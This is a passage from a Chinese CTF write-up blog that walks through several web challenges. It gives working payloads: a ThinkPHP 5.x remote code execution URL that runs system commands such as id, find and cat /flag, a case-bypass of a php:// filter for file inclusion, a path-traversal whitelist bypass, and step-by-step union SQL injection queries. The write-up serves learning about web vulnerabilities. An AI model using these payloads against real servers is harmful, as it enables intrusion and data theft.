<p><img src="/2022/06/21/Gongfang-wp/image-20220628213218629.png" alt="image-20220628213218629"></p>
<p>但是空字符无法复制，在复制时，空字符后的字符串会被截断，只复制了空字符前面的字符串</p>
<p>所以这里可以在hex里直接改，把20改成00</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233851825.png" alt="image-20220628233851825"></p>
<p>然后下方的base64编码就可以了</p>
<p>访问</p>
<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<p>得到flag</p>
<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-题目描述-16"><a href="#1-题目描述-16" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始界面如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p>
<p>（看到thinkphp我就想起今年国赛也有一道think PHP的题，爆0，麻了）</p>
<p>这里可以先了解一下什么是<a href="../../../../2022/05/28/Web-study">rce</a>和该漏洞的成因</p>
<p>如果这里版本的thinkphp存在rce的漏洞，就可以通过指令获取flag</p>
<p>百度可知</p>
<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</code> </p>
<p>然后在Github上搜thinkphp得到<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174951670.png" alt="image-20220630174951670"></p>
<p>尝试<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>了解到最后的id处为命令执行语句输入处，用 find语句查看有没有flag文件</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175318946.png" alt="image-20220630175318946"></p>
<p>得到的结果很乱，用F12整洁一些</p>
<p>最后行，看到flag文件夹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175432667.png" alt="image-20220630175432667"></p>
<p>用cat显示出来</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
<p>得到flag</p>
<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-题目描述-17"><a href="#1-题目描述-17" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题先了解<a href="../../../../2022/05/28/Web-study">php伪协议</a></p>
<p>看名字很清楚是到文件包含的题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先分析一下函数</p>
<p><code>strstr()：</code><br><code>定义和用法：</code><br><code>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</code><br><code>区分大小写，stristr()函数不区分大小写</code><br><code>语法：</code><br><code>strstr(string,search,before_search)</code><br><code>string:必需，被搜索的字符串</code><br><code>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符</code><br><code>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</code></p>
<p><code>str_replace():</code><br><code>定义和用法：</code><br><code>以其它字符替换字符串中的一些字符（区分大小写）</code><br><code>语法：</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,必需，要查找的值</code><br><code>replace，必需，要替换的值</code><br><code>string，必需，被搜索的字符串</code><br><code>count，可选，替换次数</code></p>
<p>也就是说，如果page&#x3D;的内容里有php:&#x2F;&#x2F;就会被替换为空，也就是过滤</p>
<p>但是看源码我们知道，它只过滤了小写，所以可以用大小写绕过，这里用的php:&#x2F;&#x2F;input</p>
<p>*这道题好像包括php:&#x2F;&#x2F;input，有5种方法，建议看看这篇文章<a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_include总结五种解法大同小异</a></p>
<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>
<p>php:&#x2F;&#x2F;input读取POST数据， 我先用hackbar，发现没有反应</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626215410026.png" alt="image-20220626215410026"></p>
<p>看了一篇大佬的wp，说是被过滤了，所以不行</p>
<p>但这里可以用burp试试，得到flag文件名</p>
<p>fl4gisisish3r3.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626222916776.png" alt="image-20220626222916776"></p>
<p>显示fl4gisisish3r3.php内容</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626223253399.png" alt="image-20220626223253399"></p>
<p>得到flag</p>
<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-题目描述-18"><a href="#1-题目描述-18" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>随便注</p>
<h3 id="2）wp-3"><a href="#2）wp-3" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题之前在buuctf上做过，考察堆叠注入，wp可以在<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>看一下</p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-题目描述-19"><a href="#1-题目描述-19" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-4"><a href="#2）wp-4" class="headerlink" title="2）wp"></a>2）wp</h3><p>开始就只有一张图片，先看一下它源码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703104834305.png" alt="image-20220703104834305"></p>
<p>看到有一个source.php文件</p>
<p>访问<code>http://111.200.241.244:59132/source.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__常量返回文件的完整路径和文件名，高亮显示</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//如果传的参数不是空的，并且是字符串，调用checkFile函数返回为true</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//对传来的参数进行包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//否则就输出图片</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有flag的线索，但看到一个hint.php文件</p>
<p>访问<code>http://111.200.241.244:59132/hint.php</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703105453437.png" alt="image-20220703105453437"></p>
<p>知道了flag在ffffllllaaaagggg文件里</p>
<p>然后开始分析source.php代码（可以看看源码注释）</p>
<p>分析：</p>
<p>我们可以看到，关键在于 checkfile 函数，要让它返回为ture才能够实现文件包含，我们能控制的变量是file，<u>page变量实际是file变量的形参，由checkfile函数传过去</u>，也就是file变量要满足所有的if条件，才能返回ture而不是只显示图片</p>
<p>先分析checkfile函数里的四个if条件满足要求，避免执行return false</p>
<p>第一个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果不存在（isset()）或者不为字符串（is_string()）</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>因为语句里存在return false，所以要传入的<u>变量page存在且为字符串</u>，使得if语句为假，就不会执行return false，这个本身就满足，所以可以不考虑</p>
<p>第二个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//如果在白名单里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要我们传入的参数是source.php或者hint.php，满足whitelist(白名单)，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第三个if，结合其前面代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//要截取的字符串</span><br><span class="line">               <span class="number">0</span>,//起始位置</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">               //返回？在<span class="variable">$page</span>.?字符串中出现的位置</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//如果在白名单里</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<p>第四个if</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//要截取的字符串</span><br><span class="line">                <span class="number">0</span>,//起始位置</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//截取长度</span><br><span class="line">                //返回？在<span class="variable">$_page</span>字符串中第一次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//如果在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>先把参数进行url解码，然后和第三个if一样，取传入page参数首次出现?前的部分，再进行白名单判断，即是否存在source.php或者hint.php，如果还不满足继续往下判断，满足就跳出checkfile函数</p>
<hr>
<p>至于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure>

<p>只要file不为空，且为字符串即可，可以满足不考虑</p>
<p>所以只有下面两种</p>
<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>
<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>
<p>由PHP4-7的include函数的特性</p>
<p><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在payload上加上<code>/../../../../../../ffffllllaaaagggg</code>，这里可只加四层..&#x2F;即可，但也可以加多个返回上个目录，也可以依次试试</p>
<p>得到flag</p>
<p><strong>补充</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，之前我们学过 <span class="title function_ invoke__">substr</span>() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 <span class="title function_ invoke__">mb_substr</span>()。</span><br><span class="line">实例</span><br><span class="line">从字符串中返回 <span class="string">&quot;菜鸟&quot;</span>：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;菜鸟教程&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 输出：菜鸟</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystack：要被检查的字符串。</span><br><span class="line">needle：要搜索的字符串。</span><br><span class="line">----------------</span><br><span class="line"> in_array函数功能检查数组中是否存在某个值</span><br></pre></td></tr></table></figure>

<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-题目描述-20"><a href="#1-题目描述-20" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-5"><a href="#2）wp-5" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题考查的是SQL注入，如果不清楚开始看到输入框，就应该试试各种方式，分析存在什么漏洞，比如xss或sql等等</p>
<p>开始先判断sql注入存在</p>
<p>输入**1’**，报错返回空白页面</p>
<p>然后判断字段数</p>
<p>当输入语句为</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>返回空白页面，于是判断字段数为3</p>
<p>然后联合注入</p>
<p>先判断数据爆出口</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204402467.png" alt="image-20220703204402467"></p>
<p>得出数据在2，3位置处输出</p>
<p>然后按照标准sql注入流程即可</p>
<p>先看数据库和版本号</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703204520282.png" alt="image-20220703204520282"></p>
<p>得到数据库名为<strong>news</strong>，MySQL版本为<strong>5.5.61</strong></p>
<p>然后查看news库的表名</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205326915.png" alt="image-20220703205326915"></p>
<p>得到两个表名<strong>news</strong>和<strong>secret_table</strong></p>
<p>flag肯定在<strong>secret_table</strong>里</p>
<p>查看<strong>secret_table</strong>列</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205526044.png" alt="image-20220703205526044"></p>
<p>看到fl4g，尝试查看其数据</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/Gongfang-wp/image-20220703205758800.png" alt="image-20220703205758800"></p>
<p>得到flag</p>
<p>这里用sqlmap也可以，但还是试试手工注入更好</p>
<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-题目描述-21"><a href="#1-题目描述-21" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-6"><a href="#2）wp-6" class="headerlink" title="2）wp"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">原文链接</a></p>
<p>js源代码分析：</p>
<p>_等于一个$函数内容</p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>一个输入框</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure>

<pre><code>***核心代码：***
eval函数，这是执行函数；这里执行了_变量中的内容也就是&#39;&#39;中的内容，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来
这里可以使用浏览器打开，也可以将修改后的源代码放入控制台执行（放入控制台需要注意删除script前后标签）
</code></pre>
<p>浏览器打开： <img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> ο<span class="attr">nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>

<p>我们的终极目标是打印出</p>
<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>
<p>因此我们要满足关键变量e的条件</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>这里又用到了正则表达式<br><u>^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa</u>，其它的只要匹配到就好，没有位置要求<br>于是我们构造e的值</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure>

<p>将上面的核心代码后缀改为html格式，打开如下图所示<br>在这里插入图片描述<br>框中输入e的值<code>be0f233ac7be98aa</code>，点击Ok（当然你也可以在原来获得的web100文件浏览器执行的输入框中输入be0f233ac7be98aa）</p>
<p><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="在这里插入图片描述"></p>
<p><strong>注1：当然，如果大家觉得构造麻烦，可以直接执行获取flag的核心代码，代码如下</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

